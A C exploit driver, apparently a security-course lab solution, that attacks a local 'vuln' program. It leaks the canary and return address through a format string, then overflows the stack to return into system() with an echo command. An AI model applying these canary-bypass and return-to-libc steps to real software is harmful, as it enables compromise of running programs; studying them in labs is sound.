#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>

#define MAX_GRP 1001

/******************************************************************************
   Unless you are interested in the details of how this program communicates
   with a subprocess, you can skip all of the code below and skip directly to
   the main function below. 
*******************************************************************************/

#define err_abort(x) do { \
      if (!(x)) {\
         fprintf(stderr, "Fatal error: %s:%d: ", __FILE__, __LINE__);   \
         perror(""); \
         exit(1);\
      }\
   } while (0)

char buf[1<<20];
unsigned end;
int from_child, to_child;

void print_escaped(FILE *fp, const char* buf, unsigned len) {
   int i;
   for (i=0; i < len; i++) {
      if (isprint(buf[i]))
         fputc(buf[i], stderr);
      else fprintf(stderr, "\\x%02hhx", buf[i]);
   }
}

void put_bin_at(char b[], unsigned len, unsigned pos) {
   assert(pos <= end);
   if (pos+len > end)
      end = pos+len;
   assert(end < sizeof(buf));
   memcpy(&buf[pos], b, len);
}

void put_bin(char b[], unsigned len) {
   put_bin_at(b, len, end);
}

void put_formatted(const char* fmt, ...) {
   va_list argp;
   char tbuf[10000];
   va_start (argp, fmt);
   vsnprintf(tbuf, sizeof(tbuf), fmt, argp);
   put_bin(tbuf, strlen(tbuf));
}

void put_str(const char* s) {
   put_formatted("%s", s);
}

static
void send() {
   err_abort(write(to_child, buf, end) == end);
   usleep(100000); // sleep 0.1 sec, in case child process is slow to respond
   fprintf(stderr, "driver: Sent:'");
   print_escaped(stderr, buf, end);
   fprintf(stderr, "'\n");
   end = 0;
}

char outbuf[1<<20];
int get_formatted(const char* fmt, ...) {
   va_list argp;
   va_start(argp, fmt);
   usleep(100000); // sleep 0.1 sec, in case child process is slow to respond
   int nread=0;
   err_abort((nread = read(from_child, outbuf, sizeof(outbuf)-1)) >=0);
   outbuf[nread] = '\0';
   fprintf(stderr, "driver: Received '%s'\n", outbuf);
   return vsscanf(outbuf, fmt, argp);
}

int pid;
void create_subproc(const char* exec, char* argv[]) {
   int pipefd_out[2];
   int pipefd_in[2];
   err_abort(pipe(pipefd_in) >= 0);
   err_abort(pipe(pipefd_out) >= 0);
   if ((pid = fork()) == 0) { // Child process
      err_abort(dup2(pipefd_in[0], 0) >= 0);
      close(pipefd_in[1]);
      close(pipefd_out[0]);
      err_abort(dup2(pipefd_out[1], 1) >= 0);
      err_abort(execve(exec, argv, NULL) >= 0);
   }
   else { // Parent
      close(pipefd_in[0]);
      to_child = pipefd_in[1];
      from_child = pipefd_out[0];
      close(pipefd_out[1]);
   }
}

/* Shows an example session with subprocess. Change it as you see fit, */

#define STRINGIFY2(X) #X
#define STRINGIFY(X) STRINGIFY2(X)

int main(int argc, char* argv[]) {
   unsigned seed;

   char *nargv[3];
   nargv[0] = "vuln";
   nargv[1] = STRINGIFY(GRP);
   nargv[2] = NULL;
   create_subproc("./vuln", nargv);

   fprintf(stderr, "driver: created vuln subprocess. If you want to use gdb on\n"
           "vuln, go ahead and do that now. Press 'enter' when you are ready\n"
           "to continue with the exploit\n");

   getchar();

   // Run vuln program under GDB. Set breakpoints in main_loop, auth and g
   // to figure out and populate the following values

   void *auth_bp = 0xbfffe838;     // saved ebp for auth function
   void *mainloop_bp = 0xbffff008; // saved ebp for main_loop
   void *auth_ra = 0x0804899f;     // return address for auth
   void *mainloop_ra = 0x0804eb4f; // return address for main_loop
   void *ownme = 0x804e6ce;  // address of ownme function

   // The following refer to locations on the stack
   void *auth_user = 0xbfffe630;       // _value_ of user variable in auth
   void *auth_canary_loc = 0xbfffe7fc; // location where auth's canary is stored
   void *auth_bp_loc = 0xbfffe808;     // location of auth's saved bp
   void *auth_ra_loc = 0xbfffe80c;     // location of auth's return address
   void *g_authd = 0xbfffe824;         // location of authd variable of g
   void *g_bp_val = 0xbfffefd8;     // value of saved ebp in g
   
   void * main_ra_val = 0xb7e21637;
   void *system_call_address = 0xb7e43da0;
   unsigned main_to_system_diff = system_call_address - main_ra_val;
   unsigned main_auth_bp_loc_diff = mainloop_bp - auth_bp_loc;

   // These values discovered above using GDB will vary across the runs, but the
   // differences between similar variables are preserved, so we compute those.
   unsigned mainloop_auth_bp_diff = mainloop_bp - auth_bp;
   unsigned mainloop_auth_ra_diff = mainloop_ra - auth_ra;

   unsigned auth_canary_user_diff = auth_canary_loc - auth_user;
   unsigned auth_bp_user_diff = auth_bp_loc - auth_user;
   unsigned auth_ra_user_diff = auth_ra_loc - auth_user;
   unsigned g_authd_auth_user_diff = g_authd - auth_user;
   unsigned g_ebp_main_diff = mainloop_bp - g_bp_val; // 0x30 
   unsigned mainloop_ownme_ra_diff = mainloop_ra - ownme; // 0x481

   // Use GDB + trial&error to figure out the correct offsets where the the
   // stack canary, the saved ebp value, and the return address for the
   // main_loop function are stored. Use those offsets in the place of the
   // numbers in the format string below.
   put_str("e %483$x %486$x %487$x\n %499$x");
   send();

   // Once all of the above information has been populated, you are ready to run
   // the exploit.

   unsigned cur_canary, cur_mainloop_bp, cur_mainloop_ra;
   get_formatted("%x%x%x", &cur_canary, &cur_mainloop_bp, &cur_mainloop_ra, &main_ra_val);


   // unsigned main_loop_ra_location = cur_mainloop_bp + 4 - g_ebp_main_diff;
   // unsigned ownme_address = cur_mainloop_ra - mainloop_ownme_ra_diff; 

   
   // Allocate and prepare a buffer that contains the exploit string.
   // The exploit starts at auth's user, and should go until g's authd, so
   // allocate an exploit buffer of size g_authd_auth_user_diff+sizeof(authd)
   unsigned ary_len = sizeof(int) + g_authd_auth_user_diff;
   void* *ary = (void**)malloc(ary_len);

   // Initialize the buffer with '\0', just to be on the safe side.
   memset((void*)ary, '\0', ary_len);

   // // Now initialize the parts of the exploit buffer that really matter. Note
   // // that we don't have to worry about endianness as long as the exploit is
   // // being assembled on the same architecture/OS as the process being
   // // exploited.

   ary[auth_canary_user_diff/sizeof(void*)] = (void*)cur_canary;
   ary[auth_bp_user_diff/sizeof(void*)] = (void*)(cur_mainloop_bp - mainloop_auth_bp_diff);
   ary[auth_ra_user_diff/sizeof(void*)] = (void*)(main_ra_val + main_to_system_diff);
   ary[g_authd_auth_user_diff/sizeof(void*)] = 1;
   
   unsigned i = (auth_bp_user_diff - 240)/4;

   ary[i] =   0x6e69622f;
   ary[i+1] = 0x2068732f;
   ary[i+2] = 0x2720632d;
   ary[i+3] = 0x6f686365; 
   ary[i+4] = 0x59532220; 
   ary[i+5] = 0x4d455453; 
   ary[i+6] = 0x4c414320;
   ary[i+7] = 0x2244454c;
   ary[i+8] = 0x00000027;

   ary[(auth_ra_user_diff + 2 * 4)/4] =  cur_mainloop_bp - main_auth_bp_loc_diff - 240;
   

   put_str("p xyz\n");
   send();
   put_str("u ");
   put_bin((char*)ary, ary_len);
   put_str("\n");
   send();
   //usleep(100000);
   put_str("l \n");
   send();

   usleep(100000);
   get_formatted("%*s");

   kill(pid, SIGINT);
   int status;
   wait(&status);

   if (WIFEXITED(status)) {
      fprintf(stderr, "vuln exited, status=%d\n", WEXITSTATUS(status));
   } 
   else if (WIFSIGNALED(status)) {
      printf("vuln killed by signal %d\n", WTERMSIG(status));
   } 
   else if (WIFSTOPPED(status)) {
      printf("vuln stopped by signal %d\n", WSTOPSIG(status));
   } 
   else if (WIFCONTINUED(status)) {
      printf("vuln continued\n");
   }

}
